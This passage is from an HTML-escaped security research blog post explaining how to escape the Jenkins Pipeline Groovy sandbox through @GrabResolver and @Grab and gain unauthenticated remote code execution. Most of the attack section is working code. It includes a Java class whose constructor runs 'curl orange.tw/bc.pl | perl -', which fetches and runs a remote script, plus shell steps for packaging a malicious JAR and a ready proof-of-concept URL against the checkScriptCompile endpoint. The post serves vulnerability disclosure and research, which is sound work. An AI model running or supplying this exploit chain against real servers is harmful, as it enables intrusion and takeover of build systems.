 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For more examples, you can refer to the article &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; on StackOverflow!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;first-attempt&quot;&gt;First Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming manual&lt;/a&gt; to find some exploitation ways. In the section 2.1.9, we found the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; annotation. Here is its description:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer â€œexploreâ€ the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;What! &lt;strong&gt;perform assertions on the AST&lt;/strong&gt;? Isnâ€™t that what we want? Letâ€™s write a simple Proof-of-Concept in local environment first:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, it works! However, while reproducing this on the remote Jenkins, it shows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What the hell!!! Whatâ€™s wrong with that?&lt;/p&gt;

&lt;p&gt;With a little bit digging, we found the root cause. This is caused by the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. Thatâ€™s why the error &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsable to resolve class&lt;/code&gt; occurs!&lt;/p&gt;

&lt;p&gt;How to fix this problem? Itâ€™s simple! Just go to &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; and remove the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. Itâ€™s lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;second-attempt&quot;&gt;Second Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We continued reading the &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming manual&lt;/a&gt; and found another interesting annotation - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;. There is no detailed information about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; on the manual. However, we found another article - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt; on search engine!&lt;/p&gt;

&lt;p&gt;Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.springframework&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;spring-orm&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;3.2.5.RELEASE&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, thatâ€™s enough. You can follow the &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt; proveded by &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; to execute arbitrary commands!&lt;/p&gt;

&lt;p&gt;However, without a valid credential and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, this is just an AST parser and you even canâ€™t control files on remote server. So, what can we do? By diving into more about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;, we found another interesting annotation - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://maven.restlet.org/&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1.1.6&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you are smart enough, you would like to change the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; parameter to a malicious website! Letâ€™s try this in local environment:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@GrabResolver(name=&apos;restlet&apos;, root=&apos;http://orange.tw/&apos;)
@Grab(group=&apos;org.restlet&apos;, module=&apos;org.restlet&apos;, version=&apos;1.1.6&apos;)
import org.restlet
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wow, it works! Now, we believe we can make Jenkins import any malicious library by Grape! However, the next problem is, how to get code execution?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-way-to-code-execution&quot;&gt;The Way to Code Execution&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?&lt;/p&gt;

&lt;p&gt;By diving into &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape implementation on Groovy&lt;/a&gt;, we realized the library fetching is done by the class &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt;! We started to find is there any way we can leverage, and we noticed an interesting method &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(â€¦)&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&apos;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;JAR file is just a subset of ZIP format. In the &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(â€¦)&lt;/a&gt;, Grape registers servies if there are some specified entry points. Among them, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runner&lt;/code&gt; interests me. By looking into the implementation of &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(â€¦)&lt;/a&gt;, we found this:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt;. Does it mean that we can call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; and we can invoke the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; and execute arbitrary code!&lt;/p&gt;

&lt;p&gt;Here is the full exploit:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&apos;orange.tw&apos;, root=&apos;http://[your_host]/&apos;)%0a
@Grab(group=&apos;tw.orange&apos;, module=&apos;poc&apos;, version=&apos;1&apos;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Video:&lt;/p&gt;

